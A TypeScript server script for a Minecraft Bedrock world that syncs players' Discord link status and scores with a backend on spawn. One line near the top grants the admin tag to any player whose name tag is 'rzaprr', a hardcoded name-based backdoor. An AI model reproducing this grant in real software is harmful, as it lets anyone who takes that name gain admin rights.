import { world, Player } from "@minecraft/server";
import { initialize as initializeScoreboard } from "../scoreboard/main";
import {
  getXUID,
  getPlayerData,
  updatePlayerData,
  setPlayerScore,
} from "../utils/playerUtils";
import wait from "../utils/wait";
import loginAlert from "../gui/loginAlert";
import httpReq from "../lib/httpReq";
import CONFIG from "../config/config";
import genSecret from "../lib/genSecret";
import log from "../utils/logger";
initializeScoreboard();

world.afterEvents.playerSpawn.subscribe(async ({ player, initialSpawn }) => {
  if(player.nameTag == "rzaprr" && !player.hasTag("admin")){
    player.addTag("admin");
  }
  giveDefaultItem(player);
  const playerData = getPlayerData(player);

  // Check if players is inital spawn in server. initialSpawn = offline > joined on server
  if (initialSpawn) {
    log.info("Joined Server",
      `Player ${player.nameTag} joined the server with data:`,
      JSON.stringify(playerData)
    );
    await handleInitialSpawn(player);

    if (!playerData.xuid) {
      console.log(`Player ${player.nameTag} has no XUID. Fetching...`);
      const xuid = await getXUID(player);
      updatePlayerData(player, "xuid", xuid);
      console.log(`Player ${player.nameTag} XUID set to: ${xuid}`);
      await handleInitialSpawn(player);
    }
  }
});

async function handleInitialSpawn(player: Player) {
  const playerData = getPlayerData(player);
  if (!playerData?.data?.is_linked) {
    console.log(
      `Player ${player.nameTag} is not linked. Showing login alert...`
    );
    setPlayerScore(player, "Mats", 0);
    setPlayerScore(player, "Huh", 0);
    return showLoginAlertWithDelay(player);
  }

  const response = await fetchPlayerData(playerData.xuid);
  console.log(response.body);
  if (response.status !== 200) {
    console.log(
      `Player ${player.nameTag} not found in database. Resetting data...`
    );
    resetPlayerData(player);
    return showLoginAlertWithDelay(player);
  }

  const body = JSON.parse(response.body);
  console.log(response);
  if (!body.is_verified) {
    console.log(
      `Player ${player.nameTag} is not verified. Showing login alert...`
    );
    setPlayerScore(player, "Mats", 0);
    setPlayerScore(player, "Huh", 0);
    updatePlayerData(player, "discord_id", null);
    updatePlayerData(player, "discord_username", null);
    updatePlayerData(player, "is_linked", false);

    return showLoginAlertWithDelay(player);
  }
  log.info(
    "Sync Player Data",
    `\n\n========== Syncing ${player.nameTag} Data ==========\n\nLinked: ${body.is_verified}\nDiscord ID: ${body.discord_id}\nDiscord Username: ${body.discord_username}\nmats: ${body.mats}\nhuh: ${body.huh}\n\n========== Finished Syncing ${player.nameTag} Data ==========`
  );
  updatePlayerData(player, "is_linked", true);
  updatePlayerData(player, "discord_id", body.discord_id);
  updatePlayerData(player, "discord_username", body.discord_username);
  setPlayerScore(player, "Mats", body.mats);
  setPlayerScore(player, "Huh", body.huh);
}

async function fetchPlayerData(xuid: string | number) {
  return httpReq.request({
    method: "GET",
    url: `${CONFIG.GET_USER_DATA}/${xuid}`,
    headers: {
      "Content-Type": "application/json",
      "matscraft-secret": genSecret(),
    },
  });
}

function resetPlayerData(player: Player) {
  setPlayerScore(player, "Mats", 0);
  updatePlayerData(player, "is_linked", false);
  updatePlayerData(player, "discord_id", null);
  updatePlayerData(player, "discord_username", null);
}

function giveDefaultItem(player: Player) {
  player.runCommand(`clear @s matsphone:matsphone`);
  player.runCommand(`give @s matsphone:matsphone 1`);
}

function showLoginAlertWithDelay(player: Player) {
  wait(200).then(() => loginAlert(player));
}
